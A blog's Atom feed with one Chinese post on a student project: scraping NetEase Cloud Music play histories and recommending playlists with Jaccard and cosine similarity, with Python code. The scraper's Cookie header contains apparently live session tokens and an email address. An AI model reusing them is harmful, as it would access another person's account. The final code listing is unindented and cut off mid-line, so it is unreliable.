<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SZzzT&#39;s Blog</title>
  
  <subtitle>你错过的昨夜，曾有过，多么皎洁的月</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-07-26T08:12:43.050Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>SZzzT</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>网易云音乐推荐系统</title>
    <link href="http://yoursite.com/2019/07/25/%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F/"/>
    <id>http://yoursite.com/2019/07/25/网易云音乐推荐系统/</id>
    <published>2019-07-25T10:11:11.000Z</published>
    <updated>2019-07-26T08:12:43.050Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h2><p>以网易云音乐推荐算法为例，我们设计了一款基于用户的音乐推荐算法。在获取大量用户信息的情况下，指定任意一位用户，我们可以找出与其相似度最高的用户，并且根据用户的喜好推荐出一个他可能喜欢的歌单。</p><p>本次课设大体可以分为两个模块，爬虫和推荐算法，下文将对这两个模块进行详细分析。</p><h2 id="爬虫模块"><a href="#爬虫模块" class="headerlink" title="爬虫模块"></a>爬虫模块</h2><h3 id="需要爬取的数据及爬取原因"><a href="#需要爬取的数据及爬取原因" class="headerlink" title="需要爬取的数据及爬取原因"></a>需要爬取的数据及爬取原因</h3><p>本次课程设计的目的是设计一个基于网易云音乐的歌单推荐系统，核心是一个基于特定用户的一个推荐算法，但是核心算法是基于用户的，以一个用户为中心，我们需要大量的样本去创造一个巨大的数据集，用数据集里的用户与这个中心用户进行对比，计算出相似度，数据集从何而来？我们无法获得网易云音乐的后台数据，所以需要使用爬虫技术去网易云音乐的网页上爬取关键信息。</p><p>小组在权衡利弊以后决定爬取用户的历史歌单作为数据集的组成部分，因为历史歌单反映了用户最近听取的歌曲以及用户最近的喜好，还反映了用户听取历史歌曲的次数，可以直接显示出用户的喜好。本次爬取是基于网易云音乐动态页面的爬取，具体爬取过程如下。</p><h3 id="动态网页爬取技术"><a href="#动态网页爬取技术" class="headerlink" title="动态网页爬取技术"></a>动态网页爬取技术</h3><p>经过对网易云音乐界面的分析，总结出爬取过程中需要了解到下面的几种技术</p><h4 id="动态网页"><a href="#动态网页" class="headerlink" title="动态网页"></a>动态网页</h4><p>动态网页是一个对所有动态生成与动态更新的网页的统称。与传统的静态网页相反，它会因为变量的改变而产生不同的网页，动态网页往往把随着一些数据库操作。本次页面爬取不同于静态页面，</p><h4 id="Ajax技术"><a href="#Ajax技术" class="headerlink" title="Ajax技术"></a>Ajax技术</h4><p>中文为异步的<code>JavaScript</code>和<code>xml</code>，AJAX应用可以仅向服务器发送并取回必须的数据，并在客户端采用JavaScript处理来自服务器的回应。因为在服务器和浏览器之间交换的数据大量减少，服务器回应更快了。同时，很多的处理工作可以在发出请求的客户端机器上完成，因此Web服务器的负荷也减少了</p><h4 id="XHR"><a href="#XHR" class="headerlink" title="XHR"></a>XHR</h4><p><code>XMLHTTP</code>是<code>AJAX网页开发</code>技术的重要组成部分，<code>XMLHTTP</code>是一组<code>API函数集</code>，可被<code>JavaScript</code>、<code>VBScript</code>以及其它web浏览器内嵌的脚本语言调用，通过HTTP在浏览器和web服务器之间收发XML或其它数据</p><h3 id="爬取步骤及细节"><a href="#爬取步骤及细节" class="headerlink" title="爬取步骤及细节"></a>爬取步骤及细节</h3><p>(1) 首先需要用户登录才可以获取到用户信息，所以第一步为用户登录；</p><p>(2) 因为点击历史歌单的链接，本次刷新页面只是局部刷新，所以猜测到是使用了Ajax技术，所以需要进一步分析网页的Ajax请求信息；</p><p>(3) 打开火狐浏览器的F12开发者工具，选中网络，筛选出所有的<code>JS</code>和<code>XHR</code>请求，在其发现了需要的<code>Record</code>信息；</p><img src="/2019/07/25/网易云音乐推荐系统/tu1.png" title="图1"><p>(4)    进入请求中进行详细分析，得出Ajax请求的地址信息</p><img src="/2019/07/25/网易云音乐推荐系统/tu2.png" title="图2"><p>(5)    得到传递的参数信息，传递了两个参数，<code>params</code>和<code>encSecKey</code></p><img src="/2019/07/25/网易云音乐推荐系统/tu3.png" title="图3"><p>(6)    本次爬取需要相应的用户信息才可以做到爬取特定用户的信息，所以这里需要在爬取时在HTTP请求头中加入用户的Cookie信息，做到模仿用户登录来爬取特定信息，这里我们采取<code>burpsuite</code>抓取数据包的方式获得用户的Cookie数据</p><img src="/2019/07/25/网易云音乐推荐系统/tu4.png" title="图4"><p>(7)    响应中有我们需要的详细歌单信息</p><img src="/2019/07/25/网易云音乐推荐系统/tu5.png" title="图5"><p>(8)    总结：需要用户的Cookie信息模仿登录，<code>url</code>为Ajax的请求地址，需要在请求时POST相应的参数。</p><h3 id="Python源码"><a href="#Python源码" class="headerlink" title="Python源码"></a>Python源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request, parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">url = <span class="string">"https://music.163.com/weapi/v1/play/record?csrf_token=b55a89d5bac7994f60666202c2ecd1dd"</span></span><br><span class="line"></span><br><span class="line">head = &#123;</span><br><span class="line">     <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span>,</span><br><span class="line">     <span class="string">'Referer'</span>: <span class="string">'https://music.163.com/'</span>,</span><br><span class="line">     <span class="string">'Cookie'</span>:<span class="string">'_iuqxldmzr_=32; _ntes_nnid=bb407261'</span></span><br><span class="line">              <span class="string">'  7d2c7728aeb0d00825c89c77,1545055580618; _ntes_nuid=bb4072617d2c7728aeb0d00825c89c77; WM_TID=ekr3YxPzrtVFVRFEBEcpe4*%2F*xPuJlUWfm; __utma=94650624.1316911545.1545055581.1545055581.1545825111.2; __utmz=94650624.1545825111.2.2.utmcsr=kaizynx.github.io|utmccn=(referral)|utmcmd=referral|utmcct=/2018/09/01/Blog_build/; P_INFO=904367196@qq.com|1547475857|0|lofter|00&amp;99|null&amp;null&amp;null#not_found&amp;null#10#0|&amp;0||904367196@qq.com; mail_psc_fingerprint=7c6a02915081b795221df5f7b2459fdc; WM_NI=pVyGKwYGPrlfLuuRUTeMa1KIwOsABEm8s1ADJIjPpxT7cWfNNwekW6emVaaFml1LGnnDud1Uor8nMf9rxIj*%2F*SJFXQiOOHofUULZWM07jeGlWvkye5iFAvEaZYXH2hLFha1A%3D; WM_NIKE=9ca17ae2e6ffcda170e2e6eea4c87cf3adf8b5e87f88ef8bb3c84a929b9b85b773abb286abce4981969bacdc2af0fea7c3b92ab48ab7a8ca7d9b99a093ef6e90abbbb3d860a793afd2ca43b591bda2c14fafe8bdd2c4508a97a6b1f37498e9adb8e5468ea9ab8cd63ea7b39a82e44eafb4ffadc666ae9cbb85b45fadaef88fd06efbaeb8aae92591968ab9d4638d918890e55f979496b8d03cf5b6aba8ef5db6b5b786b863869fbaa6e4529b8888d3eb4886b8afd2c437e2a3; __remember_me=true; JSESSIONID-WYYY=kloR*%2F*EKfYxX1S4*%2F*%2Bxw8%2BOCOS62GdKDh1AIwoeuGbEJESfjOKEEy1w8u9VcBbxBczUV9Fei6oQX3cTuRbRs%5CjENHa3U0Zv%2BuCXrZ3qh1mpPBtMyNK5mtbliz5ld65Yt%2BVtOZesfzV%2BCtJPJ%5Ci8rfdD7mcAVhBrTzdrVelvT8HXw7qJC6C%3A1560904504726; MUSIC_U=d52d8fce725f1a1bbd576340f32176498461110d60248d031f2f561a7b06c09a424bd0eccd382f940222602dc7446ab47955a739ab43dce1; __csrf=e62c53be7a6fcf0e9204219e51725530'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'params'</span>:<span class="string">'gzwJSGe0IUsDHQSp+44wByyhj2vXeFSQ1HpoLMfI8NNCDRxid85h1S9ZZBycBkNB7iIFldTMtdDilKgjLzqz3CanHb+BBU5uZnaX1M9FbZXk6L+cW0jwjlu9a5TnnBSe+nwgNoJFgYHCy0nShiG+IL0D7tC06LeyuX4iHq7uzAWXZQObjyhbK6SWPHFPDKKxZ+6zF0ustifWIL6P0hz6/M/sfsQeu4JIXZalOJPZPbA='</span>,    <span class="string">'encSecKey'</span>:<span class="string">'cd9ba1eb7da640f09deb1290735c1a56632875e04889ce74dc024cc1123bdf0d47da2b0573a73a3a0797f9824d0930365745258c5eda2cdc9694b67cd144754d5bcf9c6d164136a643fdc81976b4bbb3f9929f1413762b9bf65599a3e88c1223c6fa6ee259d2643caa67e7005a10fb096193c45e9c9ab72fa00a8934f644c1f2'</span></span><br><span class="line">&#125;</span><br><span class="line">data = parse.urlencode(data).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">request1 = request.Request(url, data, headers=head)</span><br><span class="line">response = request.urlopen(request1)</span><br><span class="line">html = response.read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">results = json.loads(html)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'info11.json'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">json.dump(results,f)</span><br></pre></td></tr></table></figure><p>代码使用了python的<code>urllib</code>和<code>json</code>模块，用<code>urllib</code>模块发起请求，得到响应，使用<code>json模块</code>将爬取到的<code>json格式</code>的字符存储为<code>json文件</code>，用于下一步的数据处理和算法分析。</p><h3 id="爬取结果展示"><a href="#爬取结果展示" class="headerlink" title="爬取结果展示"></a>爬取结果展示</h3><p>（1）生成大量<code>json</code>文件，部分截图如下：</p><img src="/2019/07/25/网易云音乐推荐系统/tu6.png" title="图6"><p>（2）<code>Json</code>文件中存取每个不同用户的信息</p><img src="/2019/07/25/网易云音乐推荐系统/tu7.png" title="图7"><h2 id="算法模块"><a href="#算法模块" class="headerlink" title="算法模块"></a>算法模块</h2><h3 id="算法说明"><a href="#算法说明" class="headerlink" title="算法说明"></a>算法说明</h3><p>算法的思想是基于用户的协同过滤算法，用一个词来概括可以说是物以类聚。我们分析了用户的历史数据，包括喜欢的歌曲，最近收听的歌曲，已下载的歌曲，放入歌单的歌曲等，对这些数据进行度量与打分。根据所有用户对于所有喜好歌曲的重复比例，以及相同歌曲的喜好程度，可以计算出用户之间的相似度。有相同喜好的用户之间可以进行推荐。简单来说，假定用户A喜欢歌曲a，b，用户B喜欢歌曲a，b，c，那么我们可以认为用户B喜欢的，用户A也应该喜欢。所以我们把歌曲c推荐给用户A。</p><p>我们使用了两个算法来进行相似度的比较：使用jaccard系数比较两个用户歌曲的重复程度，将两个用户对重复歌曲分别的播放次数计算余弦相似度，来比较用户对歌曲的喜欢程度。</p><h3 id="jaccard系数"><a href="#jaccard系数" class="headerlink" title="jaccard系数"></a>jaccard系数</h3><p><code>Jaccard系数</code>的公式为：</p><img src="/2019/07/25/网易云音乐推荐系统/tu8.png" title="图8"><p>用自然语言描述为用户A和用户B的交集与A，B的并集之比。主要应用于查重功能。使用jaccard系数衡量用户喜欢歌曲的相似性根据用 户所有时间听歌排行评价用户相似性时，歌单里的每一首歌都是用户喜欢的歌，系数score代表用户喜欢的程度。用A 代表用户A喜欢的歌曲集合，用B 代表用户B 喜欢的歌曲集合，则jaccadr系数为：A和B共同喜好的歌除以A和B所有听过的歌。</p><h3 id="余弦相似度"><a href="#余弦相似度" class="headerlink" title="余弦相似度"></a>余弦相似度</h3><p><code>余弦相似度</code>的公式为：</p><img src="/2019/07/25/网易云音乐推荐系统/tu9.png" title="图9"><p>由简单的余弦定理演变而来，余弦相似度用向量空间中两个向量夹角的余弦值作为衡量两个个体间差异的大小。余弦值越接近1，就表明夹角越接近0度，也就是两个向量越相似。我们将之前<code>jaccard系数</code>算出的重复的歌进行比较，获取这些歌最近的播放次数，将播放次数作为向量的内容，来计算余弦相似度。余弦值越高，表明两个用户相似度越高。求出相似度最高的用户作为推荐的样本。</p><h3 id="歌单筛选"><a href="#歌单筛选" class="headerlink" title="歌单筛选"></a>歌单筛选</h3><p>求出相似度最高的用户后如何进行推荐呢，我们爬取了该用户最近一周内所有播放的歌进行筛选，去除掉播放次数小于2的歌。我们认为播放次数小于2的歌并不代表该用户对这首歌感兴趣，也许仅仅是试听内容。将播放次数大于2的歌打包为歌单，推荐给用户，这就是实现的推荐算法。</p><h2 id="代码分析与展示"><a href="#代码分析与展示" class="headerlink" title="代码分析与展示"></a>代码分析与展示</h2><p>首先，我们爬取到了4个用户的数据，但是爬取到的数据非常多，数据是格式化的json数据，里面有我们不需要的冗余数据。这时我们就需要对爬取数据进行筛选，选出我们需要的，剔除我们不需要的。数据包括用户全部数据<code>allDate</code>和本周的最新数据数据<code>weekDate</code>，所以我们也需要对爬取的数据进行分类。</p><h3 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h3><p>我们自己编写了一个<code>handle()</code>函数，用来实现数据的预处理。handle函数有2个参数，一个是<code>info</code>，另一个是<code>mode</code>。<code>Info</code>是<code>json格式的数据</code>。标志量mode的true或者false表示当前读取的<code>allDate</code>还是<code>weekDate</code>。预处理后的数据存放在字典型变量<code>dic</code>中。字典中共有4个索引，分别是<code>singers</code>，<code>songs</code>，<code>scores</code>和<code>username</code>，分别对应用户的所听的歌曲的演唱者，歌曲名，歌曲播放评率与当前用户的用户名。然后遍历info文件，将对应数据放入字典对应组中。这样就完成了数据的预处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(info,mode=True)</span>:</span></span><br><span class="line">    username = info[<span class="string">'username'</span>]</span><br><span class="line">    <span class="keyword">if</span> mode==<span class="literal">True</span>:</span><br><span class="line">        info = info[<span class="string">'allData'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        info = info[<span class="string">'weekData'</span>]</span><br><span class="line">    dic = dict()</span><br><span class="line">    dic[<span class="string">"singers"</span>] = []</span><br><span class="line">    dic[<span class="string">"songs"</span>] = []</span><br><span class="line">    dic[<span class="string">"scores"</span>] = []</span><br><span class="line">    dic[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> info:</span><br><span class="line">        dic[<span class="string">'songs'</span>].append(item[<span class="string">'song'</span>][<span class="string">'song'</span>][<span class="string">'name'</span>])</span><br><span class="line">        dic[<span class="string">'singers'</span>].append(item[<span class="string">'song'</span>][<span class="string">'song'</span>][<span class="string">'artist'</span>][<span class="string">'name'</span>])</span><br><span class="line">        dic[<span class="string">'scores'</span>].append(item[<span class="string">'playCount'</span>])</span><br><span class="line">    \<span class="comment"># print(dic)</span></span><br><span class="line">    <span class="keyword">return</span> dic</span><br></pre></td></tr></table></figure><h3 id="求交集函数-repeatlist"><a href="#求交集函数-repeatlist" class="headerlink" title="求交集函数-repeatlist()"></a>求交集函数-repeatlist()</h3><p>因为我们使用<code>jaccard算法</code>和<code>余弦相似度算法</code>进行推荐，这两种方法都需要计算两个列表的交集。所以我们创建一个函数专门来计算交集：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repeatlist</span><span class="params">(list1, list2)</span>:</span></span><br><span class="line">    relist = list()</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        <span class="keyword">if</span> each <span class="keyword">in</span> list2:</span><br><span class="line">            relist.append(each)</span><br><span class="line">    <span class="keyword">return</span> relist</span><br></pre></td></tr></table></figure><h3 id="相似度算法1-jaccard"><a href="#相似度算法1-jaccard" class="headerlink" title="相似度算法1-jaccard()"></a>相似度算法1-jaccard()</h3><p>这部分是<code>jaccard算法</code>计算相似度，因为相似歌手和相似歌曲的<code>jaccard系数</code>都对于两个用户的相似程度，所以我们分别计算其相似度并乘以该项的权值（0.5）作为评估两个用户相似度的标准。该函数有2个参数<code>user1</code>和<code>user2</code>，是2个用户的待评估项组成的列表。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jaccard</span><span class="params">(user1,user2)</span>:</span></span><br><span class="line">    singers1 = user1[<span class="string">'singers'</span>]</span><br><span class="line">    singers2 = user2[<span class="string">'singers'</span>]</span><br><span class="line">    songs1 = user1[<span class="string">'songs'</span>]</span><br><span class="line">    songs2 = user2[<span class="string">'songs'</span>]</span><br><span class="line">    \<span class="comment"># 计算集合长度</span></span><br><span class="line">    count1 = len(singers1)</span><br><span class="line">    count2 = len(singers2)</span><br><span class="line">    \<span class="comment"># 计算交集</span></span><br><span class="line">    repeatsongs = len(repeatlist(songs1,songs2))</span><br><span class="line">    repeatsingers = len(repeatlist(singers1,singers2))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> repeatsongs <span class="keyword">and</span> <span class="keyword">not</span> repeatsingers:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    \<span class="comment"># 分别计算jaccard值</span></span><br><span class="line">    jas1 = repeatsongs / (count2 + count1 - repeatsongs)</span><br><span class="line">    jas2 = repeatsingers / (count1 + count2 - repeatsingers)</span><br><span class="line">    <span class="keyword">return</span> (jas1 + jas2) / <span class="number">2</span> * <span class="number">100</span></span><br></pre></td></tr></table></figure><h3 id="相似度算法2-cossimi"><a href="#相似度算法2-cossimi" class="headerlink" title="相似度算法2-cossimi()"></a>相似度算法2-cossimi()</h3><p>在该部分中，我们计算的是重复歌曲列表中余弦相似度。用以评估<code>jaccard系数</code>的准确程度，该函数有2个参数<code>user1</code>和<code>user2</code>，是2个用户的数据分别组成的字典为{‘singers’:,”songs”:,}。最后返回2个用户的余弦相似度。其中有一部分计算相似歌曲矩阵，我们使用<code>numpy模块</code>中的<code>array()函数</code>。将列表转化为矩阵。然后使用<code>inner()</code>方法计算所需要的数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cossimi</span><span class="params">(user1, user2)</span>:</span></span><br><span class="line">    songs1 = user1[<span class="string">'songs'</span>]</span><br><span class="line">    songs2 = user2[<span class="string">'songs'</span>]</span><br><span class="line">    repeatsongs = repeatlist(songs1, songs2)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> repeatsongs:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">score</span><span class="params">(songs, user)</span>:</span></span><br><span class="line">        scores = list()</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> repeatsongs:</span><br><span class="line">            index = songs.index(each)</span><br><span class="line">            scores.append(user[<span class="string">'scores'</span>][index])</span><br><span class="line">        <span class="keyword">return</span> scores</span><br><span class="line">    score1 = score(songs1, user1)</span><br><span class="line">    score2 = score(songs2, user2)</span><br><span class="line">    matrix1 = np.array(score1)</span><br><span class="line">    matrix2 = np.array(score2)</span><br><span class="line">    num = np.inner(matrix1, matrix2)</span><br><span class="line">    deno = np.sqrt(matrix1.dot(matrix1)) * np.sqrt(matrix2.dot(matrix2))</span><br><span class="line">    res = (num / deno) * <span class="number">100</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="生成推荐结果"><a href="#生成推荐结果" class="headerlink" title="生成推荐结果"></a>生成推荐结果</h3><p>在得到每个用户的<code>jaccard系数</code>与<code>余弦相似度</code>之后，我们取该两项的乘积作为评估两个用户匹配程度的最终得分，然后对于我们的目标用户，在指定的用户群中（理论上越多越好，本实验中为4个用户），依次计算用户群的每个用户与目标用户的匹配得分，取用户群中最高得分的用户的一周内的播放次数大于2的歌曲推荐给目标用户，之所以不推荐播放次数小于2的歌曲，是因为这部分这些歌曲可能并非是用户喜欢的歌曲而仅仅是用户试听的歌曲而已。核心代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> users:</span><br><span class="line">    jac = jaccard(item,u)</span><br><span class="line">    cos = cossimi(item,u)</span><br><span class="line">    print(<span class="string">"&#123;&#125;与&#123;&#125;的jaccard相似度为：&#123;:.2f&#125;%"</span>.format(user[<span class="string">'username'</span>],item[<span class="string">'username'</span>],jac))</span><br><span class="line">    print(<span class="string">"&#123;&#125;与&#123;&#125;的余弦相似度为：&#123;:.2f&#125;%"</span>.format(user[<span class="string">'username'</span>],item[<span class="string">'username'</span>],cos))</span><br><span class="line">    pts = jac * cos</span><br><span class="line">    <span class="keyword">if</span> pts &gt; max_num:</span><br><span class="line">        max_num = pts</span><br><span class="line">        index = users.index(item)</span><br><span class="line">         recommenduser = item[<span class="string">'username'</span>]</span><br><span class="line"></span><br><span class="line">recommend = users_weekdata[index]</span><br></pre></td></tr></table></figure><h3 id="完整代码展示"><a href="#完整代码展示" class="headerlink" title="完整代码展示"></a>完整代码展示</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(info,mode=True)</span>:</span></span><br><span class="line">username = info[<span class="string">'username'</span>]</span><br><span class="line"><span class="keyword">if</span> mode==<span class="literal">True</span>:</span><br><span class="line">info = info[<span class="string">'allData'</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">info = info[<span class="string">'weekData'</span>]</span><br><span class="line">dic = dict()</span><br><span class="line">dic[<span class="string">"singers"</span>] = []</span><br><span class="line">dic[<span class="string">"songs"</span>] = []</span><br><span class="line">dic[<span class="string">"scores"</span>] = []</span><br><span class="line">dic[<span class="string">'username'</span>] = username</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> info:</span><br><span class="line">dic[<span class="string">'songs'</span>].append(item[<span class="string">'song'</span>][<span class="string">'song'</span>][<span class="string">'name'</span>])</span><br><span class="line">dic[<span class="string">'singers'</span>].append(item[<span class="string">'song'</span>][<span class="string">'song'</span>][<span class="string">'artist'</span>][<span class="string">'name'</span>])</span><br><span class="line">dic[<span class="string">'scores'</span>].append(item[<span class="string">'playCount'</span>])</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"><span class="keyword">return</span> dic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算两个列表的重复元素</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repeatlist</span><span class="params">(list1, list2)</span>:</span></span><br><span class="line">relist = list()</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line"><span class="keyword">if</span> each <span class="keyword">in</span> list2:</span><br><span class="line">relist.append(each)</span><br><span class="line"><span class="keyword">return</span> relist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算两个用户的jaccard相似度，由于歌手和歌曲均有影响，所以分别计算歌曲和歌手的余弦相似度取平均值</span></span><br><span class="line"><span class="comment"># user参数为字典，分别为&#123;'singers':,"songs":,&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jaccard</span><span class="params">(user1,user2)</span>:</span></span><br><span class="line">singers1 = user1[<span class="string">'singers'</span>]</span><br><span class="line">singers2 = user2[<span class="string">'singers'</span>]</span><br><span class="line"></span><br><span class="line">songs1 = user1[<span class="string">'songs'</span>]</span><br><span class="line">songs2 = user2[<span class="string">'songs'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算集合长度</span></span><br><span class="line">count1 = len(singers1)</span><br><span class="line">count2 = len(singers2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算交集</span></span><br><span class="line">repeatsongs = len(repeatlist(songs1,songs2))</span><br><span class="line">repeatsingers = len(repeatlist(singers1,singers2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> repeatsongs <span class="keyword">and</span> <span class="keyword">not</span> repeatsingers:</span><br><span class="line"><span class="keyword">return</span> <span 